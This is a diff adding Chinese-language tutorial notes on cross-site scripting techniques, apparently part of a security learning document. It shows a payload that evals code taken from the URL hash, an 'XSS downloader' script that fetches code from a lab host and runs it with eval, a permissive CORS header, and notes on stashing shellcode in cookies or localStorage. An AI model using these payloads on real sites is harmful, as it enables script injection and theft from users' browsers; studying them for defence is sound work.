@@ -217,3 +217,44 @@ alert('xss.js');
 
 - windows.location.hash
 
+我们可以使用js中的windows。location.hash方法获取浏览器URL地址栏的XSS代码。
+
+windows.location.hash 会获取URL中#后面的内容，例如[http://domain.com/index.php#AJEST]windows.location.hash的值就[#AJEST]
+
+所以我们可以构造如下代码[?submit=submit&xsscode=<script>eval(location.hash.substr(1))</script>#alert(/This is windows.location.hash/)],直接提交到测试页面xss.php
+
+- XSS Downloader
+
+XSS下载器就是将XSS代码写到网页中，然后通过AJAX技术，取得网页中的XSS代码。
+在使用XSS Downloader之前需要一个我们自己的页面，xss_downloader.php,内容如下
+常见的下载器如下：
+```
+<script>
+function XSS(){
+  if (window.XMLHttpRequest) {
+    a = new XMLHttpRequest();
+  } else if (window.ActiveXObject) {
+    a = new ActiveXObject("Microsoft.XMLHTTP");
+  } else {return;}
+
+  a.open('get','http://172.16.132.161/XSS-TEST/normal/xss_downloader.php',false);
+  a.send();
+  b=a.responseText;
+  eval(unescape(b.substring(b.indexOf('BOF|')+4,b.indexOf('|EOF'))));
+}
+XSS();
+</script>
+```
+
+AJAX技术会收到浏览器同源策略的限制，为了解决这个问题，我们需要再服务器端代码中添加如下内容。
+```
+<?php
+header('Access-Control-Allow-Orign: *');
+header('Access-Control-Allow-Headers:Origin,X-Requested-With,Content-Type, Accept');
+```
+
+- 备选存储技术
+
+我们可以把Shellcode存储在客户端的本地域中，比如HTTP Cookie、Flash共享对象、UserData、localStorage等。
+
+
